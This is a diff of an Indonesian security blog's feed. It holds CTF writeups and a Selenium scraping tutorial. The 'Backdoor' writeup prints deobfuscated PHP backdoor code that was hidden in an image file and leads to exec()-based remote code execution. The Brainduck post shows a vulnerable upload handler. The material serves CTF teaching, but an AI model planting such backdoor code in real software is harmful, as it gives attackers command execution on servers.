@@ -53,7 +53,7 @@ Tutorial on youtube:  https://www.youtube.com/watch?v=tzwgIUPOQyw
 Semoga artikel ini dapat bermanfaat.
 Terima kasih.</description>
             <content type="html"><![CDATA[<p>Writeup CTF JOINTS 2020 - Twitter Collection. Halo semua, sekarang kita akan membahas cara menyelesaikan soal Twitter Collection pada CTF JOINTS 2020.</p>
-<p>URL Challenge: <a href="http://ctf.joints.id:10001/">http://ctf.joints.id:10001/</a></p>
+<p>URL Challenge: <a href="http://ctf.joints.id">http://ctf.joints.id</a>:10001/</p>
 <p>Tutorial on youtube:
 <a href="https://www.youtube.com/watch?v=tzwgIUPOQyw"><img src="https://img.youtube.com/vi/tzwgIUPOQyw/0.jpg" alt="Writeup CTF JOINTS 2020 - Twitter Collection"></a>
 <a href="https://www.youtube.com/watch?v=tzwgIUPOQyw">https://www.youtube.com/watch?v=tzwgIUPOQyw</a></p>
@@ -72,14 +72,14 @@ Terima kasih.</p>
 URL Challenge: http://68.183.176.121/
 Diberikan sebuah sourcecode yang didalamnya terdapat sebuah backdoor. Benar saja, terdapat source yang mencurigakan pada file ./assets/img/default.jfif Namun, file tersebut masih terobfuscate, sehingga kita rapikan kodenya agar mudah dibaca.
 Berikut adalah hasil kode yang sudah dirapikan:
-&amp;lt;?php include &amp;#34;variables.php&amp;#34;;$kadsooasd=&amp;#34;st&amp;#34;;$ldksadsakla=&amp;#34;ev&amp;#34;;$lkklklkdasl=&amp;#34;r&amp;#34;;$strrev=$kadsooasd.$lkklklkdasl.$lkklklkdasl.$ldksadsakla; // strrev$hello = &amp;#34;bjlgqipqipeaelohasnda&amp;#34;;$hello.</description>
+&amp;lt;?php include &amp;#34;variables.php&amp;#34;; $kadsooasd=&amp;#34;st&amp;#34;; $ldksadsakla=&amp;#34;ev&amp;#34;; $lkklklkdasl=&amp;#34;r&amp;#34;; $strrev=$kadsooasd.$lkklklkdasl.$lkklklkdasl.$ldksadsakla; // strrev $hello = &amp;#34;bjlgqipqipeaelohasnda&amp;#34;; $hello.</description>
             <content type="html"><![CDATA[<p>Writeup CTF Unity 2020 - Backdoor. Halo semua, sekarang kita akan membahas cara menyelesaikan soal Backdoor pada CTF Unity 2020.</p>
 <p>URL Challenge: http://68.183.176.121/</p>
 <p>Diberikan sebuah sourcecode yang didalamnya terdapat sebuah backdoor.
 Benar saja, terdapat source yang mencurigakan pada file <strong>./assets/img/default.jfif</strong> 
 Namun, file tersebut masih terobfuscate, sehingga kita rapikan kodenya agar mudah dibaca.</p>
 <p>Berikut adalah hasil kode yang sudah dirapikan:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
 
 <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;variables.php&#34;</span>;
 
@@ -126,11 +126,11 @@ $_POST[<span style="color:#e6db74">&#39;message&#39;</span>])){
         <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Done&#34;</span>);
     }
 } 
-<span style="color:#75715e">?&gt;</span>
-</code></pre></div><p>Hal yang mencurigakan adalah, pada baris kode:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">return @$ret(&#34;$kadsooasds \&#34;$string-$date.txt\&#34;&#34;);
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Hal yang mencurigakan adalah, pada baris kode:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">return</span> <span style="color:#f92672">@</span>$ret(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$kadsooasds</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$string</span><span style="color:#e6db74">-</span><span style="color:#e6db74">$date</span><span style="color:#e6db74">.txt</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>);
 </code></pre></div><p>Kode tersebut melakukan return fungsi <strong>exec</strong> yang dapat mengakibatkan <strong>Remote Code Execution</strong>. Jika diterjemahkan, kode tersebut mengeksekusi:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">return exec(&#34;echo \&#34;$string-$date.txt\&#34;&#34;);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;echo </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$string</span><span style="color:#e6db74">-</span><span style="color:#e6db74">$date</span><span style="color:#e6db74">.txt</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>);
 </code></pre></div><p>Dimana kita bisa mengubah nilai dari variabel <strong>$string</strong> berdasarkan parameter <strong>name</strong> pada metode <strong>POST</strong>. Sialnya, terdapat fungsi <strong>htmlentities</strong> dan fungsi yang melakukan replace spasi menjadi underscore, sehingga untuk membypassnya menjadi sulit.</p>
 <p>Sehingga, untuk membypass filter, kita akan gunakan beberapa trik berikut:</p>
 <ul>
@@ -226,17 +226,17 @@ Kita akan melakukan scrapping pada website MyAnimeList sebagai contoh.<br>
 
 myanimelist_step <span style="color:#f92672">=</span> MyAnimeListStep()
 
-<span style="color:#75715e"># the user is on the MyAnimeList current season page</span>
+<span style="color:#75715e"># the user is on the MyAnimeList current season page</span>
 myanimelist_step<span style="color:#f92672">.</span>user_open_myanimelist_website()
-<span style="color:#75715e"># the user should on privacy policy popup then click OK button</span>
+<span style="color:#75715e"># the user should on privacy policy popup then click OK button</span>
 myanimelist_step<span style="color:#f92672">.</span>user_should_on_privacy_policy_popup_then_click_ok_button()
-<span style="color:#75715e"># the user is getting all anime titles on fall 2019 page</span>
+<span style="color:#75715e"># the user is getting all anime titles on fall 2019 page</span>
 myanimelist_step<span style="color:#f92672">.</span>user_get_all_anime_titles_on_fall_2019_page()
-<span style="color:#75715e"># the user should see winter 2020 button and click on it</span>
+<span style="color:#75715e"># the user should see winter 2020 button and click on it</span>
 myanimelist_step<span style="color:#f92672">.</span>user_should_see_winter_2020_button_and_click_it()
-<span style="color:#75715e"># the user is getting all anime titles on winter 2020 page</span>
+<span style="color:#75715e"># the user is getting all anime titles on winter 2020 page</span>
 myanimelist_step<span style="color:#f92672">.</span>user_get_all_anime_titles_on_winter_2020_page()
-<span style="color:#75715e"># the user is saving all anime titles to json file</span>
+<span style="color:#75715e"># the user is saving all anime titles to json file</span>
 myanimelist_step<span style="color:#f92672">.</span>user_save_all_anime_titles_to_json_file()
 
 myanimelist_step<span style="color:#f92672">.</span>end()
@@ -247,7 +247,7 @@ myanimelist_step<span style="color:#f92672">.</span>end()
 
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyAnimeListStep</span>:
     <span style="color:#66d9ef">def</span> __init__(self):
-        self<span style="color:#f92672">.</span>__base_url <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://myanimelist.net/anime/season</span><span style="color:#e6db74">&#39;</span>
+        self<span style="color:#f92672">.</span>__base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://myanimelist.net/anime/season&#39;</span>
         self<span style="color:#f92672">.</span>__myanimelist_page <span style="color:#f92672">=</span> MyAnimeListPage(self<span style="color:#f92672">.</span>__base_url)
 
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_open_myanimelist_website</span>(self):
@@ -283,7 +283,7 @@ Oleh karena itu, selanjutnya kita akan membuat file pages.py yang berisikan kode
         self<span style="color:#f92672">.</span>__url <span style="color:#f92672">=</span> url
         self<span style="color:#f92672">.</span>__driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Chrome()
 
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open</span>(self, path <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>):
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open</span>(self, path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>):
         self<span style="color:#f92672">.</span>__driver<span style="color:#f92672">.</span>get(self<span style="color:#f92672">.</span>__url <span style="color:#f92672">+</span> path)
 </code></pre></div><p>Pada kode diatas, kita melakukan inisiasi url dan chromedriver yang akan selalu digunakan.<br>
 Lalu kita membuat method open untuk membuka url pada browser.</p>
@@ -304,9 +304,9 @@ Sebelum itu, kita akan menggunakan extension ChroPath untuk mencari nilai dari X
         self<span style="color:#f92672">.</span>__url <span style="color:#f92672">=</span> url
         self<span style="color:#f92672">.</span>__driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Chrome()
 
-        self<span style="color:#f92672">.</span>__button_privacy_policy <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">//button[contains(text(),</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">OK</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)]</span><span style="color:#e6db74">&#34;</span>
+        self<span style="color:#f92672">.</span>__button_privacy_policy <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;//button[contains(text(),&#39;OK&#39;)]&#34;</span>
     
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open</span>(self, path <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>):
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open</span>(self, path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>):
         self<span style="color:#f92672">.</span>__driver<span style="color:#f92672">.</span>get(self<span style="color:#f92672">.</span>__url <span style="color:#f92672">+</span> path)
 
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">click_button_privacy_policy</span>(self):
@@ -326,12 +326,12 @@ Lalu, pada method click_button_privacy_policy, kita gunakan WebDriverWait until 
         self<span style="color:#f92672">.</span>__url <span style="color:#f92672">=</span> url
         self<span style="color:#f92672">.</span>__driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Chrome()
 
-        self<span style="color:#f92672">.</span>__button_privacy_policy <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">//button[contains(text(),</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">OK</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)]</span><span style="color:#e6db74">&#34;</span>
+        self<span style="color:#f92672">.</span>__button_privacy_policy <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;//button[contains(text(),&#39;OK&#39;)]&#34;</span>
 
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__wait_until</span>(self, ec, by, value):
         <span style="color:#66d9ef">return</span> WebDriverWait(self<span style="color:#f92672">.</span>__driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(ec((by, value)))
     
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open</span>(self, path <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>):
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open</span>(self, path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>):
         self<span style="color:#f92672">.</span>__driver<span style="color:#f92672">.</span>get(self<span style="color:#f92672">.</span>__url <span style="color:#f92672">+</span> path)
 
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">click_button_privacy_policy</span>(self):
@@ -355,14 +355,14 @@ Maka hasil akhir dari pages.py adalah seperti berikut</p>
         self<span style="color:#f92672">.</span>__url <span style="color:#f92672">=</span> url
         self<span style="color:#f92672">.</span>__driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Chrome()
 
-        self<span style="color:#f92672">.</span>__button_privacy_policy <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">//button[contains(text(),</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">OK</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)]</span><span style="color:#e6db74">&#34;</span>
-        self<span style="color:#f92672">.</span>__text_title <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">//a[@class=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">link-title</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">]</span><span style="color:#e6db74">&#34;</span>
-        self<span style="color:#f92672">.</span>__button_winter2020 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">//a[contains(text(),</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Winter 2020</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)]</span><span style="color:#e6db74">&#34;</span>
+        self<span style="color:#f92672">.</span>__button_privacy_policy <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;//button[contains(text(),&#39;OK&#39;)]&#34;</span>
+        self<span style="color:#f92672">.</span>__text_title <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;//a[@class=&#39;link-title&#39;]&#34;</span>
+        self<span style="color:#f92672">.</span>__button_winter2020 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;//a[contains(text(),&#39;Winter 2020&#39;)]&#34;</span>
 
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__wait_until</span>(self, ec, by, value):
         <span style="color:#66d9ef">return</span> WebDriverWait(self<span style="color:#f92672">.</span>__driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(ec((by, value)))
     
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open</span>(self, path <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>):
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open</span>(self, path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>):
         self<span style="color:#f92672">.</span>__driver<span style="color:#f92672">.</span>get(self<span style="color:#f92672">.</span>__url <span style="color:#f92672">+</span> path)
 
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">click_button_privacy_policy</span>(self):
@@ -391,7 +391,7 @@ Maka hasil akhir dari pages.py adalah seperti berikut</p>
 
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyAnimeListStep</span>:
     <span style="color:#66d9ef">def</span> __init__(self):
-        self<span style="color:#f92672">.</span>__base_url <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://myanimelist.net/anime/season</span><span style="color:#e6db74">&#39;</span>
+        self<span style="color:#f92672">.</span>__base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://myanimelist.net/anime/season&#39;</span>
         self<span style="color:#f92672">.</span>__myanimelist_page <span style="color:#f92672">=</span> MyAnimeListPage(self<span style="color:#f92672">.</span>__base_url)
 
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_open_myanimelist_website</span>(self):
@@ -413,11 +413,11 @@ Maka hasil akhir dari pages.py adalah seperti berikut</p>
 
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_save_all_anime_titles_to_json_file</span>(self):
         data <span style="color:#f92672">=</span> {
-            <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">fall-2019</span><span style="color:#e6db74">&#39;</span>: self<span style="color:#f92672">.</span>__text_titles_fall2019,
-            <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">winter-2020</span><span style="color:#e6db74">&#39;</span>: self<span style="color:#f92672">.</span>__text_titles_winter2020
+            <span style="color:#e6db74">&#39;fall-2019&#39;</span>: self<span style="color:#f92672">.</span>__text_titles_fall2019,
+            <span style="color:#e6db74">&#39;winter-2020&#39;</span>: self<span style="color:#f92672">.</span>__text_titles_winter2020
         }
 
-        f <span style="color:#f92672">=</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">anime_titles.json</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">w</span><span style="color:#e6db74">&#39;</span>)
+        f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;anime_titles.json&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)
         f<span style="color:#f92672">.</span>write(json<span style="color:#f92672">.</span>dumps(data, indent <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>))
         f<span style="color:#f92672">.</span>close()
     
@@ -446,12 +446,12 @@ Terima kasih.</p>
             <description>Terdapat sebuah web yang memiliki fitur untuk menginterpretasikan esolang brainfuck.
 Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.
 Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:
-&amp;lt;?phpif (isset($_GET[&amp;#34;debug&amp;#34;])) {highlight_file(__FILE__);die();}function processUpload() {if (!is_uploaded_file($_FILES[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;])) {throw new Exception(&amp;#39;Bukan file terupload&amp;#39;);}if ($_FILES[&amp;#39;file&amp;#39;][&amp;#39;size&amp;#39;] &amp;gt; 500) {throw new Exception(&amp;#39;Ukuran file tidak boleh melebihi 500 bytes&amp;#39;);}// harusnya cuma boleh &amp;gt;&amp;lt;+-[].</description>
+&amp;lt;?php if (isset($_GET[&amp;#34;debug&amp;#34;])) { highlight_file(__FILE__); die(); } function processUpload() { if (!is_uploaded_file($_FILES[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;])) { throw new Exception(&amp;#39;Bukan file terupload&amp;#39;); } if ($_FILES[&amp;#39;file&amp;#39;][&amp;#39;size&amp;#39;] &amp;gt; 500) { throw new Exception(&amp;#39;Ukuran file tidak boleh melebihi 500 bytes&amp;#39;); } // harusnya cuma boleh &amp;gt;&amp;lt;+-[].</description>
             <content type="html"><![CDATA[<p>Terdapat sebuah web yang memiliki fitur untuk menginterpretasikan esolang brainfuck.</p>
 <p><img src="/wp-content/2019/02/bd.png" alt=""></p>
 <p>Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.</p>
 <p>Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
   <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;debug&#34;</span>])) {
     <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
@@ -505,70 +505,70 @@ Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat
       $error <span style="color:#f92672">=</span> $e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getMessage</span>();
     }
   }
-<span style="color:#75715e">?&gt;</span>
-<span style="color:#75715e">&lt;!-- /?debug=V --&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
-&lt;<span style="color:#f92672">html</span>&gt;
-  &lt;<span style="color:#f92672">head</span>&gt;
-    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
-    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X-UA-Compatible&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IE=edge&#34;</span>&gt;
-    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;</span>&gt;
-
-    &lt;<span style="color:#f92672">title</span>&gt;Brainduck&lt;/<span style="color:#f92672">title</span>&gt;
-
-    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vendor/bootstrap/css/bootstrap.min.css&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>&gt;
-  &lt;/<span style="color:#f92672">head</span>&gt;
-
-  &lt;<span style="color:#f92672">body</span>&gt;
-    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container-fluid&#34;</span>&gt;
-
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">if</span>($error)<span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
-      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert alert-danger&#34;</span>&gt;
-        <span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">htmlspecialchars</span>($error); <span style="color:#75715e">?&gt;</span>
-      &lt;/<span style="color:#f92672">div</span>&gt;
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">elseif</span>($file)<span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
-      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert alert-success&#34;</span>&gt;
-        File sukses terupload. &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">htmlspecialchars</span>($file); <span style="color:#75715e">?&gt;</span><span style="color:#e6db74">&#34;</span>&gt;Download&lt;/<span style="color:#f92672">a</span>&gt;
-      &lt;/<span style="color:#f92672">div</span>&gt;
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">endif</span>; <span style="color:#75715e">?&gt;</span>
-
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">if</span>($output <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span>)<span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">if</span>($output <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
-        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-header alert alert-danger&#34;</span>&gt;
-          Tidak ada output atau terjadi error
-        &lt;/<span style="color:#f92672">div</span>&gt;
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
-      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card mb-3&#34;</span>&gt;
-        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-header alert alert-success&#34;</span>&gt;
-          Output
-        &lt;/<span style="color:#f92672">div</span>&gt;
-        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-body&#34;</span>&gt;
-          &lt;<span style="color:#f92672">code</span>&gt;<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">htmlspecialchars</span>($output); <span style="color:#75715e">?&gt;</span>&lt;/<span style="color:#f92672">code</span>&gt;
-        &lt;/<span style="color:#f92672">div</span>&gt;
-      &lt;/<span style="color:#f92672">div</span>&gt;
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">endif</span>; <span style="color:#75715e">?&gt;</span>
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">endif</span>; <span style="color:#75715e">?&gt;</span>
-
-      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card mb-3&#34;</span>&gt;
-        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-header&#34;</span>&gt;
-          Upload file Brainduck
-        &lt;/<span style="color:#f92672">div</span>&gt;
-        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-body&#34;</span>&gt;
-          Contoh:
-          &lt;<span style="color:#f92672">ul</span>&gt;
-            &lt;<span style="color:#f92672">li</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;examples/hello_world.bf&#34;</span>&gt;Hello World!&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">li</span>&gt;
-            &lt;<span style="color:#f92672">li</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;examples/squares.bf&#34;</span>&gt;Bilangan Kuadrat&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">li</span>&gt;
-          &lt;/<span style="color:#f92672">ul</span>&gt;
-          &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
-            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">required</span>&gt;
-            &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn btn-primary&#34;</span>&gt;Upload&lt;/<span style="color:#f92672">button</span>&gt;
-          &lt;/<span style="color:#f92672">form</span>&gt;
-        &lt;/<span style="color:#f92672">div</span>&gt;
-      &lt;/<span style="color:#f92672">div</span>&gt;
-    &lt;/<span style="color:#f92672">div</span>&gt;
-  &lt;/<span style="color:#f92672">body</span>&gt;
-&lt;/<span style="color:#f92672">html</span>&gt;
-</code></pre></div><p>Sebenarnya tak ada hubungannya dengan brainfuck, jika kita melihat source diatas, kita dapat menyimpulkan bahwa vuln terdapat dibagian Upload File.</p>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;!-- /?debug=V --&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;!DOCTYPE html&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;html&gt;
+</span><span style="color:#960050;background-color:#1e0010">  &lt;head&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;meta charset=&#34;utf-8&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">    &lt;title&gt;Brainduck&lt;/title&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">    &lt;link href=&#34;vendor/bootstrap/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">  &lt;/head&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">  &lt;body&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;div class=&#34;container-fluid&#34;&gt;
